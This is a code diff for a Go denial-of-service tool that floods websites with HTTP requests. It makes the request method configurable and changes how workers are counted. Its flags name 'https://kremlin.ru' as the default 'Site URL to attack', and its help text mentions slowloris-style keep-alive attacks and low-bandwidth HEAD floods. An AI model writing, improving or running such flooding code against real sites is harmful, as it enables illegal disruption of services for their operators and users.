@@ -25,7 +25,7 @@ var (
 	sites             []*Site
 	delay             time.Duration
 	maxWorkersPerSite int
-	HTTPmethod        *string
+	HTTPMethod        *string
 )
 
 func init() {
@@ -34,7 +34,7 @@ func init() {
 	sitesFile := flag.String("sites-file", "./sites.txt", "Path to file with URLs, each on a new line")
 	site := flag.String("site", "https://kremlin.ru", "Site URL to attack")
 	delayFlag := flag.Int("delay", 0, "Sleep time in milliseconds between each request per worker. Can be increased for keep-alive attacks similar to slowloris")
-	HTTPmethod = flag.String("method", "GET", "HTTP method to use. Can be HEAD for low bandwidth attacks. POST payloads are not implemented")
+	HTTPMethod = flag.String("method", "GET", "HTTP method to use. Use HEAD for low bandwidth attacks. POST payloads are not implemented now")
 	flag.Parse()
 
 	delay = time.Duration(*delayFlag) * time.Millisecond
@@ -78,7 +78,7 @@ func loadSitesFromFile(filename string) ([]*Site, error) {
 }
 
 func newRequest(url string) (*http.Request, error) {
-	r, err := http.NewRequest("GET", url, nil)
+	r, err := http.NewRequest(*HTTPMethod, url, nil)
 	if err != nil {
 		return nil, err
 	}
@@ -95,6 +95,8 @@ func runWorker(id int, site *Site) {
 	if err != nil {
 		return
 	}
+
+	site.workers++
 
 	// Errors in a row without any successfull request
 	errors := 0
@@ -150,7 +152,6 @@ func main() {
 	for i := 0; i < maxWorkersPerSite; i++ {
 		for _, site := range sites {
 			go runWorker(i, site)
-			site.workers++
 			wg.Add(1)
 			time.Sleep(120 * time.Millisecond)
 		}
